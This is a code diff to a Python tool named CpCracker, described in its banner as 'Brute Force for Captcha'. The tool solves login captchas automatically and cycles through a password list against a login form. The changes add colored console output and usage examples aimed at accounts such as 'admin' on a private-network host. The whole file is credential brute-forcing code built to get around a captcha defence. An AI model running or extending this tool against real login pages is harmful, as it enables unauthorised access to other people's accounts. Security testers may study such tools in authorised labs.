@@ -1,8 +1,6 @@
 import argparse
 import time
-
 from colorama import Fore, Style
-
 from captcha_processor import CaptchaProcessor
 from config import *
 from password_manager import PasswordManager
@@ -12,7 +10,9 @@ from result_checker import ResultChecker
 
 class Cracker:
     """
-    python main.py --target-url http://10.0.0.103:5000/login --captcha-url http://10.0.0.103:5000/captcha --user Jarway --pwd password --cap captcha
+    python main1.py --target-url http://10.0.0.103:5000/login --captcha-url http://10.0.0.103:5000/captcha --user Jarway --pwd password --cap captcha
+    python main1.py --target-url http://10.0.0.103:5000/login --captcha-url http://10.0.0.103:5000/captcha --user admin --pwd password --cap captcha
+    python main1.py --target-url http://10.0.0.103:5000/login --captcha-url http://10.0.0.103:5000/captcha --user SanLan --pwd password --cap captcha
     """
 
     def __init__(self, target_url: str, captcha_url: str, username_field: str, password_field: str,
@@ -52,12 +52,12 @@ class Cracker:
                 captcha_text = self.captcha_processor.recognize_captcha(self.captcha_path)
                 if not captcha_text:
                     print(
-                        f"[ --- ] The verification code recognition failed. Skip the current password")
+                        f"{Fore.RED}[ --- ]{Style.RESET_ALL} The verification code recognition failed. Skip the current password")
                     self.request_handler.cleanup_captcha(self.captcha_path)
                     continue
                 print(
-                    f"[ ... ] Trying passwd:  >>> {password} <<< , "
-                    f"captcha: *** {captcha_text} *** ")
+                    f"{Fore.BLUE}[ ... ]{Style.RESET_ALL} Trying passwd: {Fore.LIGHTBLUE_EX} >>> {password} <<< {Style.RESET_ALL}, "
+                    f"captcha:{Fore.LIGHTBLUE_EX} *** {captcha_text} *** {Style.RESET_ALL}")
                 # 发送登录请求
                 response_content = self.request_handler.send_login_request(
                     self.login_url,
@@ -70,19 +70,19 @@ class Cracker:
                 is_preset, username = self.result_checker.check_preset_credentials(password)
                 # 检查是否登录成功
                 if is_preset:
-                    print(f"[ ... ] Response Length:  bytes")
+                    print(f"{Fore.BLUE}[ ... ]{Style.RESET_ALL} Response Length: {self.bytes} bytes")
                     print(
-                        f"[ +++ ] Maybe Success! Username: {username},"
-                        f" password: {password}")
+                        f"{Fore.GREEN}[ +++ ]{Style.RESET_ALL} Maybe Success! Username: {Fore.YELLOW}{username}{Style.RESET_ALL},"
+                        f" password: {Fore.YELLOW}{password}{Style.RESET_ALL}")
                     continue
                 # 打印响应字节长度
                 content_length = len(response_content)
-                print(f"[ ... ] Response Length:: {content_length} bytes")
+                print(f"{Fore.BLUE}[ ... ]{Style.RESET_ALL} Response Length:: {content_length} bytes")
                 # 检查是否登录成功
                 # if self.result_checker.is_login_successful(content_length):
                 #     print(f"{Fore.GREEN}[ + ]{Style.RESET_ALL} Maybe Successfully ! Username: {username}, password: {password}")
             except Exception as e:
-                print(f"[ --- ] Processing raising Error: {e}")
+                print(f"{Fore.RED}[ --- ]{Style.RESET_ALL} Processing {password} raising Error: {e}")
 
             finally:
                 # 清理验证码图片
@@ -104,7 +104,7 @@ def print_banner():
 ║                                                          ════~~~~~~~
 ║  ➤ PROJECT: CpCracker                                   ═══~~
 ║  ➤ VERSION: 1.0.0                                       ════~~~~
-║  ➤ AUTHOR: ** CypherGhost >> (ZooNJarway)              ════~~
+║  ➤ AUTHOR: ** CypherGhost >> (ZooNJarway)               ════~~
 ║  ➤ DESCRIPTION: Brute Force for Captcha                 ════
 ║                                                         ═════
 ╚════════════════════════════════════════════════════════════~~~~~~~
